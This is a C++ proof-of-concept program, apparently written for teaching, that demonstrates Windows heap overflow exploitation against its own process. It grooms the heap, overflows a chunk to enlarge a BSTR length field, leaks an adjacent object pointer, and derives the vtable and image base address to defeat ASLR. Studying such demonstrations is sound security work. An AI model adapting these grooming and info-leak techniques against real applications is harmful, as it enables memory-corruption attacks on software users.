#include <Windows.h>
#include <comdef.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <iostream>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

// Author: Carlos Dominguez
// Based on: https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/
// Compile: g++-32 .\heap-overflow-32.cpp -o .\heap-overflow-32.exe -loleaut32 -fpermissive [-g]

// some object from an app
class SomeObject {
public:
  void function1() {};
  virtual void virtual_function1() {};
};

int main(int argc, char** argv) {
  int i;
  BSTR bstr;
  BSTR bstrAtHole;
  BOOL result;
  HANDLE hChunk;
  void* allocations[ALLOC_COUNT];
  BSTR bStrings[5];

  if(argc != 2){
    fprintf(stderr, "Use .\\heap-overflow <imageBase - vtable offset>\n");
    return -1;
  }

  SomeObject* object = new SomeObject();
  HANDLE defaultHeap = GetProcessHeap();
  if (defaultHeap == NULL) {
    printf("No process heap. Are you having a bad day?\n");
    return -1;
  }

  printf("Default heap = 0x%08x\n", defaultHeap);

  // We seek to accommodate memory in a predictable configuration. To do this, we must make a maximum of 18 allocations
  // This is because the backend is more predictable than the front-end, which is activated after 18 allocations of equal size
  // In addition, we must take care with first and last allocations that may have a different address gap than the rest, which will have jumps of equal size
  printf("The following should be all in the backend allocator\n");
  for (i = 0; i < ALLOC_COUNT; i++) {
    hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
    memset(hChunk, 'A', CHUNK_SIZE);
    allocations[i] = hChunk;
    printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
  }

  // After this, some of the intermediate allocations are freed in order to create a hole, such as:
  // [ Chunk 1 ][ Free chunk ][ Chunk 3 ] 
  printf("Freeing allocation at index 3: 0x%08x\n", allocations[3]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We try to fill the hole with some kind of object with a size header you could modify (goal of attack to leak adyacent information)
  // Usually, the ideal chunks are actually objects from the application, but a recognizable object in memory is enough for this demonstration
  // Fill with several objects to incresa the chances of sucess
  for (i = 0; i < 5; i++) {
    bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    bStrings[i] = bstr;
    printf("[%d] BSTR string : 0x%08x\n", i, bstr);
    if(allocations[3] + 4 == bstr) bstrAtHole = bstr;
  }

  // Now, we need to free up the next chunk after the hole to fill it with any object we want to leak (ideally, it is filled with objects from the app)
  // [ Chunk 1 ][ BSTR ][ Free Chunk ]
  printf("Freeing allocation at index 4 : 0x%08x\n", allocations[4]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[4]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We fill the new hole with pointers of SomeObject that we want to leak to obtain it vtable address
  // [ Chunk 1 ][ BSTR ][ Array of pointers ]
  int objRef = (int) object;
  printf("SomeObject address : 0x%08x\n", objRef);
  printf("Allocating SomeObject to vectors\n");
  vector<int> array1(40, objRef);
  vector<int> array2(40, objRef);
  vector<int> array3(40, objRef);
  vector<int> array4(40, objRef);
  vector<int> array5(40, objRef);
  vector<int> array6(40, objRef);
  vector<int> array7(40, objRef);
  vector<int> array8(40, objRef);
  vector<int> array9(40, objRef);
  vector<int> array10(40, objRef);

  // We see the initial size of the object placed in the first hole. This is stored in the first 4 bytes of the chunk where the BSTR is stored
  UINT strSize = SysStringByteLen(bstrAtHole);
  printf("Original String size: %d\n", (int) strSize);
  printf("Overflowing allocation 2\n");
  //DebugBreak();

  // First pause to analyze memory before attack
  system("PAUSE");

  // Fill the previous chunk of BSTR chunk and overflow it to change the size of BSTR
  int allocOffset = (int) allocations[3] - (int) allocations[2];
  std::string evilString;
  evilString.append(allocOffset, 'B');
  evilString.append("\x20\x01\x00", 3);
  memcpy(allocations[2], evilString.data(), evilString.size());

  // Print new size of BSTR (not modified by a legitimate user, but by the attacker)
  // This BSTR size change allow an attacker to see information after his allocated space, 
  // so attacaker can see data from other users (dta that ideally filled the second hole)
  strSize = SysStringByteLen(bstrAtHole);
  printf("Modified String size: %d\n", (int) strSize);
  //DebugBreak();

  // Access to data out of space of original BSTR (attacker access to data inside the chunk with object of other users)
  std::wstring ws(bstrAtHole, SysStringLen(bstrAtHole));
  std::string s(reinterpret_cast<const char*>(ws.data()), strSize);
  std::string ref = s.substr(248+28, 4);
 
  // Use data leaked to reconstruct the address of SomeObject 
  char buf[4];
  memcpy(buf, ref.data(), 4);
  int refAddr = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
  printf("SomeObject leak: 0x%08x", refAddr);
  //DebugBreak();

  // Use the leaked address of SomeObject to calculate vtable address (see the address of virtual_function1 stored in object of class SomeObject) 
  // and use it address to obtain the image base address (is necessary to obtain offset between image base and vtable with external app)
  // Image base address is an interesant thing to probe if baseAddr and vtable offset is correct (can be check with winDBG or IDA)
  memcpy(buf, (void*) refAddr, 4);
  int vftable = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
  printf("Found vftable address : 0x%08x\n", vftable);
  unsigned int offset = (unsigned int) strtoul(argv[1], NULL, 16);
  int baseAddr = vftable - offset;
  printf("====================================\n");
  printf("Image base address is : 0x%08x\n", baseAddr);
  printf("====================================\n");
  //DebugBreak();

  // Second pause to analyze memory after attack
  system("PAUSE");

  return 0;
}